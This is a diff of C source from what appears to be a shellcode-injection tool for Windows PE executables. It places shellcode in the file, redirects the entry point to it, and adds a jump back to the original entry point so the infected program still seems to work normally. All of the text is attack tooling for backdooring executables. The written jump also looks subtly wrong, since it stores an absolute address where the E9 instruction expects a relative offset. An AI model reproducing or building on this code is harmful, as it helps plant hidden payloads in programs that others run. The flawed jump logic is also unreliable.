@@ -72,9 +72,15 @@ int main(int argc , char **argv){
 		inject_data id;
 		injectData(pe, sections, cf_shellcode,&id);
 		printf("Shellcode is at %lx\n",id.position_in_memory);
-		// uint32_t oldEntry = pe->image_nt_header->image_optional_header.addressOfEntryPoint;
+		uint32_t oldEntry = pe->image_nt_header->image_optional_header.addressOfEntryPoint;
+		printf("Old Entrypoint is at relative (%x) - raw (%x)\n", oldEntry, oldEntry + pe->image_nt_header->image_optional_header.imageBase);
 		pe->image_nt_header->image_optional_header.addressOfEntryPoint = id.position_in_memory - pe->image_nt_header->image_optional_header.imageBase;
-		printf("Patched the entrypoint to be %x\n",pe->image_nt_header->image_optional_header.addressOfEntryPoint);
+		printf("New Entrypoint is at %x\n",pe->image_nt_header->image_optional_header.addressOfEntryPoint);
+
+
+		void *dst = pe->buffer + id.offset_in_file + cf_shellcode->size;
+		*(unsigned char *)(dst) = 0xe9;
+		*(uint32_t *)(dst + sizeof(unsigned char)) = oldEntry + pe->image_nt_header->image_optional_header.imageBase;
 
 		bufferToFile(pe->buffer, pe->size, mapKeyLookup(args, "-output"));
 		destroyCompoundFile(cf_shellcode);
